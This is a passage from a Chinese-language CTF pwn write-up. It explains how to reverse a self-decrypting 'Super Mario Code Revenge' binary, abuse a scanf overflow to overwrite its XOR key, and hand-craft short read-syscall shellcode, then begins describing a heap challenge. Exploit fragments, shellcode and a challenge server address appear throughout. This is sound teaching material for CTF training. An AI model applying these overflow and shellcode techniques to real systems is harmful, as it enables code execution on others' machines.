-</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-</code></pre></div></div> <h3 id="-super-mario-code-revengehard">🎮 Super Mario Code Revenge(😡Hard)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-Sh1no 出了一个简单的堆题。因为这个题太简单了所以 Sh1no 决定发挥他在 Re 里学到的高超技术——代码自解密壳来让你没法轻易逆向漏洞函数。
-
-看不到了吧嘿嘿，快使用你高超的 Fuzz 技巧来试试吧！
-
-nc 152.136.11.155 10038
-
-💡 Hint
-直接动态调试就可以看到加密部分的代码
-
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-免责声明：flag 由 @Timlzh 提供
-
-🔨 暴打出题人
-@Shino
-</code></pre></div></div> <h5 id="最先上的一道hard题属于是比较温油的hard但还是hard首先根据提示这个题使用了一个反逆向技术叫做自修改代码">   最先上的一道hard题，属于是比较温油的hard，但还是hard。<br/>   首先，根据提示，这个题使用了一个反逆向技术，叫做<code class="language-plaintext highlighter-rouge">自修改代码</code>。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rcx</span>
-  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
-  <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
-
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">"================================================"</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">"|          SUPER MARIO CODE REVENGE!!!         |"</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">"|  https://ctf-wiki.org/reverse/obfuscate/smc/ |"</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">"================================================"</span><span class="p">);</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter ur name to enter the Mario World!:"</span><span class="p">);</span>
-  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-  <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">marioGame</span> <span class="o">&amp;</span> <span class="o">-</span><span class="n">getpagesize</span><span class="p">());</span>
-  <span class="n">v3</span> <span class="o">=</span> <span class="n">getpagesize</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span> <span class="n">mprotect</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>  <span class="c1">// &lt;---------- 从这里开始</span>
-  <span class="p">{</span>
-    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">513</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
-      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">marioGame</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">10</span><span class="p">];</span>
-    <span class="n">puts_banner</span><span class="p">();</span>         <span class="c1">// &lt;--------- 一个打印界面的函数</span>
-    <span class="n">marioGame</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>       <span class="c1">// &lt;---------- 调用解密之后的函数</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="k">else</span>
-  <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">"Mario Dies. Plz Try again or contact @Shino."</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div> <h6 id="甚至把攻略贴在文件里哭死">   甚至把攻略贴在文件里，哭死。</h6> <h5 id="可以看到自修改代码就是在运行时解密代码由于ida是静态调试所以无法呈现正确的代码首先把加密代码段提权为rwx原本的text没有写权限然后从这个函数开始每十字节位一轮查表异或直到全部解密完成表是pwn5shino这十个字节">   可以看到，自修改代码就是在运行时解密代码，由于IDA是静态调试，所以无法呈现正确的代码。首先把加密代码段提权为rwx，原本的.text没有写权限，然后，从这个函数开始，每十字节位一轮，查表异或，直到全部解密完成。表是’Pwn5Shino!’这十个字节<br/></h5> <h5 id="看一眼mariogame">   看一眼<code class="language-plaintext highlighter-rouge">marioGame</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401236</span> <span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401236</span>                 <span class="n">mov</span>     <span class="n">ds</span><span class="o">:</span><span class="mi">3</span><span class="n">C8BE02006CF7078h</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040123</span><span class="n">F</span>                 <span class="n">imul</span>    <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">2</span><span class="n">EBC469Bh</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401245</span>                 <span class="n">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">0</span><span class="n">Dh</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401247</span>                 <span class="n">db</span>      <span class="mi">26</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401247</span>                 <span class="n">in</span>      <span class="n">al</span><span class="p">,</span> <span class="mi">25</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">A</span>                 <span class="n">jnz</span>     <span class="kt">short</span> <span class="n">loc_4012AB</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">C</span>                 <span class="n">outsb</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">D</span>                 <span class="n">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">2</span><span class="n">BE02053h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401252</span>                 <span class="n">xchg</span>    <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401254</span>                 <span class="n">nop</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401254</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401255</span>                 <span class="n">db</span> <span class="mi">3</span><span class="n">Fh</span><span class="p">,</span> <span class="mf">0E3</span><span class="n">h</span><span class="p">,</span> <span class="mi">30</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span>                 <span class="n">jmp</span>     <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="mi">69</span><span class="n">h</span><span class="p">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="n">B</span>                 <span class="n">db</span> <span class="mi">6</span><span class="n">Eh</span><span class="p">,</span> <span class="mi">27</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="n">A8h</span><span class="p">,</span> <span class="mi">97</span><span class="n">h</span><span class="p">,</span> <span class="mi">9</span><span class="n">Fh</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401260</span>                 <span class="n">dq</span> <span class="mi">946</span><span class="n">AE32197ACCB02h</span><span class="p">,</span> <span class="mi">3381</span><span class="n">AFDA7D6E775Dh</span><span class="p">,</span> <span class="mf">65E630</span><span class="n">E33FAFDE91h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040127</span><span class="mi">8</span>                 <span class="n">dq</span> <span class="mi">0</span><span class="n">CB209F97A8276E69h</span><span class="p">,</span> <span class="mi">775</span><span class="n">D996AE32197ACh</span><span class="p">,</span> <span class="mi">0</span><span class="n">DE915181AFDA7D6Eh</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="mi">90</span>                 <span class="n">dq</span> <span class="mf">6E6965</span><span class="n">E230E33FAFh</span><span class="p">,</span> <span class="mi">6853356</span><span class="n">ECF97A827h</span><span class="p">,</span> <span class="mf">70E33</span><span class="n">FAFDE913581h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">A8</span>                 <span class="n">db</span> <span class="mi">0</span><span class="n">B3h</span><span class="p">,</span> <span class="mi">20</span><span class="n">h</span><span class="p">,</span> <span class="mf">0E0</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span> <span class="n">loc_4012AB</span><span class="o">:</span>                             <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span><span class="o">:</span> <span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">A</span><span class="err">↑</span><span class="n">j</span>
-</code></pre></div></div> <h5 id="可以看到ida虽然做出尝试但显然加密是有效的考虑使用先使用idapython对这一段内容解密注意先import-idc">   可以看到IDA虽然做出尝试，但显然加密是有效的。<br/>   考虑使用先使用IDApython，对这一段内容解密。注意先<code class="language-plaintext highlighter-rouge">import idc</code></h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f75f242322c.png" alt="Screenshot 2024-09-27 203200.png"/></p> <h5 id="下面是弄完后的效果">   下面是弄完后的效果。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f7606c5daf2.png" alt="Screenshot 2024-09-28 095529.png"/></p> <h5 id="可以看到识别了但也没完全识别和wiki上不一样这是因为x86有庞大的指令集这个函数实现逻辑略有复杂所以ida识别出现歧义也比较正常而且ida也没有检查反汇编结果是否合理这时候就需要做一个手动引导">   可以看到，识别了，但也没完全识别，和wiki上不一样。<br/>   这是因为x86有庞大的指令集，这个函数实现逻辑略有复杂，所以IDA识别出现歧义也比较正常，而且IDA也没有检查反汇编结果是否合理。这时候就需要做一个手动引导。<br/></h5> <h5 id="先打开动态调试动态调试中可以看到正确汇编代码">   先打开动态调试，动态调试中可以看到正确汇编代码。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f762523dc6a.png" alt="Screenshot 2024-09-28 100307.png"/></p> <h5 id="对于这种错误识别的汇编指令我们右键它点击undefine可以将其还原为单字节">   对于这种错误识别的汇编指令，我们右键它，点击<code class="language-plaintext highlighter-rouge">Undefine</code>，可以将其还原为单字节。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76156df32b.png" alt="Screenshot 2024-09-28 095912.png"/></p> <h5 id="右键然后assemble可以调出patch窗口注意只有汇编指令处才有这个选项所有指令打开的窗口都是同一个此时我们从动态调试中复制一条指令比如首个未能正确解析的指令mov----dword-ptr-rbp-0x24edi将它复制到assembly窗口栏中绿色代表从这个位置开始匹配指令粉色代表匹配到了指令的位置">   右键然后<code class="language-plaintext highlighter-rouge">Assemble...</code>，可以调出<code class="language-plaintext highlighter-rouge">Patch</code>窗口。注意只有汇编指令处才有这个选项，所有指令打开的窗口都是同一个。<br/>   此时我们从动态调试中复制一条指令，比如首个未能正确解析的指令<code class="language-plaintext highlighter-rouge">mov DWORD PTR [rbp-0x24],edi</code>，将它复制到<code class="language-plaintext highlighter-rouge">Assembly</code>窗口栏中。绿色代表从这个位置开始匹配指令，粉色代表匹配到了指令的位置。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76443642b4.png" alt="Screenshot 2024-09-28 101130.png"/></p> <h5 id="然后回车并退出这个窗口右键刚刚解放出来的单字节点击code就可以看到还原成功了">   然后，回车并退出这个窗口，右键刚刚解放出来的单字节，点击<code class="language-plaintext highlighter-rouge">Code</code>，就可以看到还原成功了。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76581f28fe.png" alt="Screenshot 2024-09-28 101351.png"/></p> <h5 id="你可能发现一条指令正确识别了别的又错了这很正常重复上述操作需要注意有时候不需要手动汇编匹配右键就有code按也就是说不用一条指令一条指令地去匹配-弄完了之后记得和动态调试的结果对比一下">   你可能发现，一条指令正确识别了，别的又错了，这很正常。重复上述操作，需要注意，有时候不需要手动汇编匹配右键就有<code class="language-plaintext highlighter-rouge">Code</code>按，也就是说，不用一条指令一条指令地去匹配。<br/>    弄完了之后记得和动态调试的结果对比一下。<br/></h5> <h5 id="可能是由于我ida的问题无法按照wiki上的方法反编译只能根据shino的提示先跳过这一段">   可能是由于我IDA的问题，无法按照wiki上的方法反编译，只能根据Shino的提示先跳过这一段。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76752ea2ff.png" alt="Screenshot 2024-09-28 102447.png"/></p> <h5 id="不过这个题做完了之后还是找到了反编译的方法挺玄学仅供参考当确认反汇编无误之后先使用apply-patches-to修改二进制文件退出ida删掉原先的i64或者干脆不打包然后再ida打开修改后的二进制文件就可以反编译了">   不过这个题做完了之后，还是找到了反编译的方法，挺玄学，仅供参考。<br/>   当确认反汇编无误之后，先使用<code class="language-plaintext highlighter-rouge">Apply patches to</code>修改二进制文件，退出IDA，删掉原先的.i64（或者干脆不打包），然后再IDA打开修改后的二进制文件，就可以反编译了😅(<br/></h5> <h5 id="回到正题这个漏洞确实不在加密函数里注意到__isoc99_scanfs-name这个东西可以理解为和getsname一样的东西也就是存在溢出这里的name是一个全局变量">   回到正题，这个漏洞确实不在加密函数里。注意到<code class="language-plaintext highlighter-rouge">__isoc99_scanf("%s", name);</code>，这个东西可以理解为和<code class="language-plaintext highlighter-rouge">gets(name)</code>一样的东西，也就是存在溢出。这里的<code class="language-plaintext highlighter-rouge">name</code>是一个全局变量。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">0000000000404070</span>                 <span class="n">public</span> <span class="n">name</span>
-<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">0000000000404070</span> <span class="n">name</span>            <span class="n">db</span> <span class="err">'</span><span class="n">DefaultUserName</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>  <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="err">↑</span><span class="n">o</span>
-<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span>                 <span class="n">public</span> <span class="n">key</span>
-<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span> <span class="n">key</span>             <span class="n">db</span> <span class="err">'</span><span class="n">Pwn5Shino</span><span class="o">!</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>       <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">14</span><span class="n">C</span><span class="err">↑</span><span class="n">o</span>
-<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span> <span class="n">_data</span>           <span class="n">ends</span>
-<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span>
-</code></pre></div></div> <h5 id="name正好在密钥的上面也就是说可以通过溢出修改密钥然后思考修改密钥有什么用之前说到密钥与密文对应异或就可以得到原文然后程序执行这一段的原文所以说控制了密钥就控制了解密出来的指令然后执行我们控制的指令那么这就好办了由数学可知使用密文去异或我们想要的指令即可得到篡改后的密钥下面是一个demo注意返回的是字符串不是bytes">   <code class="language-plaintext highlighter-rouge">name</code>正好在密钥的上面，也就是说可以通过溢出修改密钥。<br/>   然后思考修改密钥有什么用，之前说到，密钥与密文对应异或，就可以得到原文，然后程序执行这一段的原文。所以说控制了密钥，就控制了解密出来的指令，然后执行我们控制的指令。<br/>   那么这就好办了，由数学可知，使用密文去异或我们想要的指令，即可得到篡改后的密钥，下面是一个demo，注意返回的是字符串不是bytes<br/></h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genkey</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">crypto</span><span class="p">):</span>
-    <span class="n">key</span> <span class="o">=</span> <span class="sh">''</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
-        <span class="n">temp</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">sh</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">crypto</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
-        <span class="n">key</span> <span class="o">+=</span> <span class="n">temp</span>
-    <span class="k">return</span> <span class="n">key</span>
-<span class="c1"># 原文里的前十位
-</span><span class="n">crypto10</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xa3\x78\x70\xcf\x06\x20\xe0\x8b\x3c\x69</span><span class="sh">'</span>
-</code></pre></div></div> <h5 id="想法美好但现实残酷由于本来的密钥只有10位原文索引模10后查表异或所以无论密钥如何篡改可以自由支配的指令最多只有10位-显然10位的shellcode不足以getshell所以根据经验想办法用这10字节弄一个read的系统调用然而调用一次read至少需要12字节如果想要更多的读入指令长度也会增长">   想法美好，但现实残酷，由于本来的密钥只有10位，原文索引模10后查表异或，所以无论密钥如何篡改，可以自由支配的指令最多只有10位。<br/>    显然10位的shellcode不足以<code class="language-plaintext highlighter-rouge">getshell()</code>，所以根据经验想办法用这10字节弄一个<code class="language-plaintext highlighter-rouge">read</code>的系统调用，然而调用一次<code class="language-plaintext highlighter-rouge">read</code>至少需要12字节，如果想要更多的读入，指令长度也会增长。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">)))</span>
-<span class="mi">12</span>
-</code></pre></div></div> <h5 id="所以这个shellcode还是得手写手写shellcode主要关注的是raxrdirsirdx这四个寄存器分别是系统调用号文件流读入的地址和读入字符数量">   所以这个shellcode还是得手写。手写shellcode主要关注的是<code class="language-plaintext highlighter-rouge">rax</code>、<code class="language-plaintext highlighter-rouge">rdi</code>、<code class="language-plaintext highlighter-rouge">rsi</code>、<code class="language-plaintext highlighter-rouge">rdx</code>，这四个寄存器，分别是系统调用号、文件流、读入的地址和读入字符数量。<br/></h5> <h5 id="断点下载进入函数前0x4015db动态调试一下">   断点下载进入函数前(0x4015db)，动态调试一下，</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> RAX  0
- RBX  0
- RCX  0x7ffff7e97887 <span class="o">(</span>write+23<span class="o">)</span> ◂— cmp rax, <span class="nt">-0x1000</span> /<span class="k">*</span> <span class="s1">'H='</span> <span class="k">*</span>/
- RDX  1
- RDI  0
- RSI  1
- R8   0x467
- R9   0x7ffff7fc9040 <span class="o">(</span>_dl_fini<span class="o">)</span> ◂— endbr64 
- R10  0x7ffff7d8b2e0 ◂— 0xf0022000056ec
- R11  0x246
- R12  0x7fffffffdb18 —▸ 0x7fffffffddd1 ◂— <span class="s1">'/home/pwn/worktable/cnss2024/pwn11'</span>
- R13  0x401458 <span class="o">(</span>main<span class="o">)</span> ◂— endbr64  /<span class="k">*</span> 0xe5894855fa1e0ff3 <span class="k">*</span>/
- R14  0x403e18 <span class="o">(</span>__do_global_dtors_aux_fini_array_entry<span class="o">)</span> —▸ 0x401200 <span class="o">(</span>__do_global_dtors_aux<span class="o">)</span> ◂— endbr64  /<span class="k">*</span> 0x2ebd3d80fa1e0ff3 <span class="k">*</span>/
- R15  0x7ffff7ffd040 <span class="o">(</span>_rtld_global<span class="o">)</span> —▸ 0x7ffff7ffe2e0 ◂— 0
- RBP  0x7fffffffda00 ◂— 1
- RSP  0x7fffffffd9f0 ◂— 0x20200001000
- RIP  0x4015db <span class="o">(</span>main+387<span class="o">)</span> ◂— call 0x401236 /<span class="k">*</span> 0xb8fffffc56e8 <span class="k">*</span>/
-</code></pre></div></div> <h5 id="可以看到rax和rdi恰好都是0read的调用号以及stdin这两个就不用管了主要弄剩下两个">   可以看到，<code class="language-plaintext highlighter-rouge">rax</code>和<code class="language-plaintext highlighter-rouge">rdi</code>恰好都是0（<code class="language-plaintext highlighter-rouge">read</code>的调用号以及<code class="language-plaintext highlighter-rouge">stdin</code>），这两个就不用管了。主要弄剩下两个。<br/></h5> <h5 id="demo1">   demo1</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode1</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
-    mov rsi, 0x401240 ; 0x401236 + 10
-    mov rdx, 0x50
-    syscall
-</span><span class="sh">'''</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">))</span>
-<span class="mi">16</span>
-</code></pre></div></div> <h5 id="显然demo1肯定不行了这是因为syscall是固定2字节而mov实际上是一个相当长的指令在构造短shellcode是应尽量避免使用尽量使用pop和push指令尤其在置空寄存器时可以使用xor-rax-rax">   显然demo1肯定不行了，这是因为syscall是固定2字节，而<code class="language-plaintext highlighter-rouge">mov</code>实际上是一个相当长的指令，在构造短shellcode是应尽量避免使用，尽量使用<code class="language-plaintext highlighter-rouge">pop</code>和<code class="language-plaintext highlighter-rouge">push</code>指令，尤其在置空寄存器时，可以使用<code class="language-plaintext highlighter-rouge">xor rax, rax</code></h5> <h5 id="demo2">   demo2</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
-    push 0x401240
-    pop rsi
-    push 0x50
-    pop rdx
-    syscall
-</span><span class="sh">'''</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">))</span>
-<span class="mi">11</span>
-</code></pre></div></div> <h5 id="玛德正好多一个仔细分析一下rsi要求必须是一定的值所以它的pop和push省不了但rdx不一样只要是一个大数就行注意到此时由于call指令rsp指向的是返回地址0x4015e0已经足够大所以就把它的push给省掉">   玛德正好多一个<br/>   仔细分析一下，<code class="language-plaintext highlighter-rouge">rsi</code>要求必须是一定的值，所以它的<code class="language-plaintext highlighter-rouge">pop</code>和<code class="language-plaintext highlighter-rouge">push</code>省不了，但<code class="language-plaintext highlighter-rouge">rdx</code>不一样，只要是一个大数就行。注意到，此时由于<code class="language-plaintext highlighter-rouge">call</code>指令，<code class="language-plaintext highlighter-rouge">rsp</code>指向的是返回地址（0x4015E0），已经足够大，所以就把它的<code class="language-plaintext highlighter-rouge">push</code>给省掉。</h5> <h5 id="demo3">   demo3</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode3</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
-    pop rdx
-    push 0x401240
-    pop rsi
-    syscall
-</span><span class="sh">'''</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode3</span><span class="p">))</span>
-<span class="mi">9</span>
-</code></pre></div></div> <h5 id="甚至还少一字节结尾加一个nop占位这样前面算密钥的就不用再改了">   甚至还少一字节😜，结尾加一个<code class="language-plaintext highlighter-rouge">nop</code>占位，这样前面算密钥的就不用再改了。</h5> <h3 id="-ffffree">⚡ FFFFree!</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-魔法铁匠铺的独特笔记
-无视空间，使用特殊链表相互连接
-
-据传只需携带扉页
-即可全数悉知笔记内容
-
-匠人吟诵咒文，隐藏秘密的页码
-后人倾力研究
-至暴怒、至癫狂、至忘我、至死亡
-
-还我自由！他们绝望地喊道……
-
-💡 Hint
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Astesia
-</code></pre></div></div> <h5 id="介绍一下本题的数据结构本题有关堆的结构是一个链表链表分为控制信息和数据信息首先控制信息有一个固定有一个head-node然后随着链表的添加接着添加其他的node">   介绍一下本题的数据结构。本题有关堆的结构是一个链表，链表分为控制信息和数据信息。首先控制信息有一个固定有一个head node，然后随着链表的添加接着添加其他的node<br/></h5> <h5 id="大概是下面一个结构某个结点free之后idx就会被设置为0x7fffffff表示不可读但本身还留在链表中在show时先从stdin中读取一个idx然后用next依次计数找到链表中第idx个结点puts出text的内容一个这样的控制结点大小固定为0x18也就是一个chunk固定为0x20然后是text指向的数据域也是指定大小范围00x70也就是这个题和unsorted-bin关系不大了">   大概是下面一个结构，某个结点free之后，idx就会被设置为<code class="language-plaintext highlighter-rouge">0x7fffffff</code>表示不可读，但本身还留在链表中；在show时，先从stdin中读取一个idx，然后用<code class="language-plaintext highlighter-rouge">*next</code>依次计数找到链表中第idx个结点，<code class="language-plaintext highlighter-rouge">puts()</code>出<code class="language-plaintext highlighter-rouge">*text</code>的内容。一个这样的控制结点大小固定为<code class="language-plaintext highlighter-rouge">0x18</code>，也就是一个chunk固定为<code class="language-plaintext highlighter-rouge">0x20</code><br/>   然后是<code class="language-plaintext highlighter-rouge">*text</code>指向的数据域，也是指定大小范围<code class="language-plaintext highlighter-rouge">0~0x70</code>，也就是这个题和<code class="language-plaintext highlighter-rouge">unsorted bin</code>关系不大了。<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">node</span><span class="p">{</span>
-    <span class="kt">long</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// 有没有符号不太记得了</span>
-    <span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
-    <span class="n">_BYTE</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
-<span class="p">}</span>
